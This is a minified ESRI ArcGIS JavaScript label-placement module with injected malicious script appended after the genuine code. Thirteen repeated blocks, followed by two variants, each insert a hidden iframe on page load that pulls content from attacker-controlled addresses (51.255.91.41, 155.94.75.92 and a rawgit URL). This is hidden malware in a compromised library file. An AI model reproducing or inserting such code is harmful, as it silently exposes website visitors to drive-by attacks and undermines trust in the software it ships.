// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare ./geometry-utils ./labeling-utils esri/geometry/geometryEngine esri/geometry/screenUtils esri/graphic esri/geometry/Point esri/geometry/Extent esri/symbols/Font esri/symbols/TextSymbol".split(" "),function(q,d,l,m,r,t,u,v,n,p){return q(null,{map:null,point:null,xOffset:0,yOffset:0,text:"",verticalAlign:"",horizontalAlign:"",rotation:0,color:null,fontFamily:"",fontSize:0,font:null,constructor:function(b){this.map=b.map;this.point=b.point;this.xOffset=b.labelParameters.xOffset||
0;this.yOffset=b.labelParameters.yOffset||0;this.text=b.text;this.verticalAlign=b.verticalAlign||"bottom";this.verticalAlign.toLowerCase();this.horizontalAlign=b.horizontalAlign||"middle";this.horizontalAlign.toLowerCase();this.rotation=b.labelParameters.rotation||0;this.rotation=90*Math.round(this.rotation/90);this.color=b.labelParameters.color;this.font=(new n).setFamily(b.labelParameters.fontFamily||"Arial, Helvetica, sans-serif").setSize(b.labelParameters.fontSize||0).setWeight(n.WEIGHT_BOLD)},
getPixelWidth:function(){return 0!==this.rotation%180?this.font.size:l.getWidthOfText(this.text,this.font.family,this.font.size)},getPixelHeight:function(){return 0!==this.rotation%180?l.getWidthOfText(this.text,this.font.family,this.font.size):this.font.size},decreaseFontSize:function(b){0!==this.font.size&&(this.font.setSize(this.font.size-(b||1)),this.setExtent())},setExtent:function(){var b=this.map,a=b.toScreen(this.point),c=this.getPixelWidth(),e=this.getPixelHeight()/1.3333,f,g,h,k;switch(this.horizontalAlign){case "left":a=
a.offset(this.xOffset,0);f=a.x;h=a.x+c;break;case "middle":case "center":f=a.x-c/2;h=a.x+c/2;break;case "right":a=a.offset(-this.xOffset,0),f=a.x-c,h=a.x}switch(this.verticalAlign){case "bottom":case "lower":a=a.offset(0,-this.yOffset);g=a.y;k=a.y-e;break;case "middle":case "center":g=a.y+e/2;k=a.y-e/2;break;case "upper":case "top":a=a.offset(0,this.yOffset),g=a.y+e,k=a.y}a=new v({xmin:f,ymin:g,xmax:h,ymax:k});this.extent=d.toWebMercator(r.toMapGeometry(b.extent,b.width,b.height,a))},getExtent:function(){this.extent||
this.setExtent();return this.extent},fitsInPolygon:function(b){var a=this.getExtent(),a=d.toWebMercator(a);b=d.toWebMercator(b);return m.contains(b,a)},fitsInExtent:function(b){var a=this.getExtent(),a=d.toWebMercator(a);b=d.toWebMercator(b);return m.contains(b,a)},shrinkToFit:function(b,a){a=a||0;!this.fitsInPolygon(b)&&0<this.font.size&&(this.font.setSize(this.font.size-1),this.font.size<a&&this.font.setSize(0),this.setExtent(),this.shrinkToFit(b,a))},getLabelGraphic:function(){var b=(new p(this.text)).setColor(this.color).setAlign(p.ALIGN_START).setFont(this.font),
a=this.getExtent(),c=this.map.toScreen(this.point),a=this.map.toScreen(new u([a.xmin,a.ymin],a.spatialReference));b.setOffset(a.x-c.x,-(a.y-c.y));return new t(this.point,b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});